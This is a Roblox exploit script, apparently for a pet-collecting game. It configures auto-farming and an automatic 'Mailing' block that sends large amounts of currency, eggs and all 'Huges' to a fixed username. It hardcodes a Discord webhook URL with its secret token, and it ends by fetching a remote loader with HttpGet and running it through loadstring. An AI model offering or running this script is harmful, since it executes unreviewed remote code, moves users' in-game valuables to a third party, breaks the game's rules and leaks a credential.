  getgenv().Config = {
    ["Farming"] = {
        ["AutoEvents"] = {"Party Box", "Mini Pinata"},
        ["AutoOpen"] = {"Gift Bag", "Large Gift Bag", "Mini Chest", "Diamond Gift Bag"},
        ["AutoFlags"] = {"Fortune Flag"}
    },
    ["Mailing"] = {
        ["Usernames"] = {"kingltnsell"},
        ["Items"] = {
            ["Currency"] = {
                ["Diamonds"] = 50000000,
            },
            ["Egg"] = {
                ["Huge Machine Egg 4"] = 1,
            },
            ["Misc"] = {
                ["Golden Pencil"] = 50,
                ["Diamond Pencil"] = 25,
                ["Rainbow Pencil"] = 10,
            }
        },
        ["MailAllHuges"] = true
    },
    ["Notifications"] = {
        ["UserID"] = "",
        ["Webhook"] = "https://discord.com/api/webhooks/1326468696431923260/JPrgIn-4rORXjSCLlmELZUZs6mEpeyQaXsGQGolFScEdW2RHsicyAmB_odtC2TKu-WGg"
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/83e3e1375d5a7c51c79df057fe9ea9e2.lua"))()
